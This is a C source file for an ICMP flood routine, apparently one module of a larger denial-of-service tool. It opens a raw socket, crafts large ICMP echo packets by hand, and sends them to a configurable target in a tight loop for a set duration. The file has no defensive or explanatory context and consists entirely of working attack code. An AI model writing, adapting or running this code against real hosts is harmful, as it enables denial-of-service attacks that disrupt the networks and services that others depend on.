#define _GNU_SOURCE

#include "headers/icmp_attack.h"
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <errno.h>

void* icmp_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return NULL;

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sock);
        return NULL;
    }

    int packet_size = params->psize > 0 ? params->psize : 56;
    if (packet_size > 64500) packet_size = 64500;

    unsigned char *packet = calloc(1, packet_size + sizeof(struct iphdr));
    if (!packet) {
        close(sock);
        return NULL;
    }

    struct iphdr *iph = (struct iphdr*)packet;
    struct icmphdr *icmph = (struct icmphdr*)(packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(packet_size + sizeof(struct iphdr));
    iph->id = htons(getpid());
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_ICMP;
    iph->check = 0;
    iph->saddr = INADDR_ANY;
    iph->daddr = params->target_addr.sin_addr.s_addr;

    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->un.echo.id = htons(getpid() & 0xFFFF);
    icmph->un.echo.sequence = 0;
    icmph->checksum = 0;

    unsigned char *payload = packet + sizeof(struct iphdr) + sizeof(struct icmphdr);
    for (int i = 0; i < packet_size - sizeof(struct icmphdr); i++) {
        payload[i] = (unsigned char)(i & 0xFF);
    }

    time_t end_time = time(NULL) + params->duration;
    unsigned long packets_sent = 0;
    
    while (params->active && time(NULL) < end_time) {
        icmph->un.echo.sequence = htons(packets_sent & 0xFFFF);
        icmph->checksum = 0;
        
        unsigned short *ptr = (unsigned short*)icmph;
        unsigned long sum = 0;
        int icmplen = packet_size;
        while (icmplen > 1) {
            sum += *ptr++;
            icmplen -= 2;
        }
        if (icmplen == 1) {
            sum += *(unsigned char*)ptr;
        }
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        icmph->checksum = ~sum;

        if (sendto(sock, packet, packet_size + sizeof(struct iphdr), 0, 
                  (struct sockaddr*)&params->target_addr, sizeof(params->target_addr)) > 0) {
            packets_sent++;
        }
    }

    free(packet);
    close(sock);
    return NULL;
}
